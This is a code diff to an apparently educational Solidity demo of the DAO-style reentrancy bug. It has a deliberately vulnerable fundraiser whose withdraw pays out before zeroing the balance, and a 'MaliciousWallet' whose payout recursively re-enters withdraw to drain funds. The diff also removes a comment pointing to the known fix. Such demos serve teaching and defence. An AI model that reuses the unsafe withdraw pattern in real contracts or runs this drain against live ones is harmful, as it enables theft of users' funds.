@@ -12,9 +12,6 @@ contract VulnerableFundraiser {
     // VULNERABLE
     function withdrawAllMyCoins() payable public {
     
-        // With the Fix that was fixed on PR 242 over at the DAO
-        // https://github.com/slockit/DAO/pull/242/files
-    
         uint widthdrawAmout = balances[msg.sender];
         MaliciousWallet wallet = MaliciousWallet(msg.sender);
         wallet.payout.value(widthdrawAmout)();
@@ -63,18 +60,14 @@ contract MaliciousWallet {
     
     function payout()  payable public { 
     
-        // Gegular Payout
-        fundraiser.withdrawAllMyCoins(); // Hey before you set my balance to 0 give me more!
-    }
-
-    function HackedPayout()  payable public { 
-    
         //exploit - using recursion
+        
         
         if (recursions > 0) { // Don't loop forever
             recursions--;
             fundraiser.withdrawAllMyCoins(); // Hey before you set my balance to 0 give me more!
         }
+        
         
     
     }
